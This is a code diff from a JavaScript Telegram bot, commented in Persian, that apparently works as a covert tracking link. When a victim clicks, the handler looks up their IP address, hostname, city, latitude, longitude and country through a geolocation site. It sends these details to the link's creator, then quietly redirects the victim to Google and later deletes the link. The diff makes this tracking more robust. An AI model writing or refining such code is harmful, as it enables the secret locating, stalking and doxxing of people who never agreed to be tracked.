@@ -111,29 +111,61 @@ module.exports = async (req, res) => {
             `🔔 اعلان کلیک! شخصی روی لینک شما (${linkId}) کلیک کرد.`
         ).catch(e => console.error("Error sending notification:", e));
         
-        fetch(`https://ipgeolocation.io/what-is-my-ip/${userInfo.ip}`).then(res => res.text()).then(s => {
-            const $ = load(s)
-            console.log("before send ip to geoip site")
-            const data = $("#code-json").attr("data-full")
-            console.log(data)
-            bot.api.sendMessage(
-            creatorId,
-            `ip: ${data.ip}
-            hostname: ${data.hostname}
-            location: ${data.location.city}
-            latitude: ${data.location.latitude}
-            longitude: ${data.location.longitude}
-            country code: ${data.location.country_code2}
-            country name: ${data.location.country_name}
-            `
-            )
-        })
+        fetch(`https://ipgeolocation.io/what-is-my-ip/${userInfo.ip}`)
+            .then(res => res.text())
+            .then(s => {
+                const $ = load(s);
+                console.log("before send ip to geoip site");
+                const dataStr = $("#code-json").attr("data-full");
+                console.log("Raw data:", dataStr);
+                
+                if (dataStr) {
+                    try {
+                        const data = JSON.parse(dataStr);
+                        console.log("Parsed data:", data);
+                        
+                        bot.api.sendMessage(
+                            creatorId,
+                            `📍 اطلاعات موقعیت مکانی:
+🌐 IP: ${data.ip || 'N/A'}
+🖥 Hostname: ${data.hostname || 'N/A'}
+🏙 شهر: ${data.location?.city || 'N/A'}
+📍 عرض جغرافیایی: ${data.location?.latitude || 'N/A'}
+📍 طول جغرافیایی: ${data.location?.longitude || 'N/A'}
+🏳 کد کشور: ${data.location?.country_code2 || 'N/A'}
+🌍 نام کشور: ${data.location?.country_name || 'N/A'}`
+                        ).catch(e => console.error("Error sending location message:", e));
+                    } catch (parseError) {
+                        console.error("Error parsing data-full attribute:", parseError);
+                        bot.api.sendMessage(
+                            creatorId,
+                            `⚠️ خطا در دریافت اطلاعات موقعیت مکانی\nIP: ${userInfo.ip}`
+                        ).catch(e => console.error("Error sending error message:", e));
+                    }
+                } else {
+                    console.error("data-full attribute not found");
+                    bot.api.sendMessage(
+                        creatorId,
+                        `⚠️ اطلاعات موقعیت مکانی یافت نشد\nIP: ${userInfo.ip}`
+                    ).catch(e => console.error("Error sending fallback message:", e));
+                }
+            })
+            .catch(fetchError => {
+                console.error("Error fetching geolocation:", fetchError);
+                bot.api.sendMessage(
+                    creatorId,
+                    `⚠️ خطا در دریافت اطلاعات موقعیت مکانی\nIP: ${userInfo.ip}`
+                ).catch(e => console.error("Error sending error message:", e));
+            });
 
         // ۴. هدایت کاربر به یک مقصد نهایی
         res.writeHead(302, { Location: 'https://www.google.com' });
 
-        // Remove link After 10 seconds
-        setTimeout(async () => await DB.deleteLink(linkId), 10 * 1000)
+        // Remove link After 10 minutes
+        setTimeout(async () => {
+            await DB.deleteLink(linkId);
+            console.log(`Link ${linkId} deleted after 10 minutes`);
+        }, 10 * 60 * 1000);
 
         res.end();
 
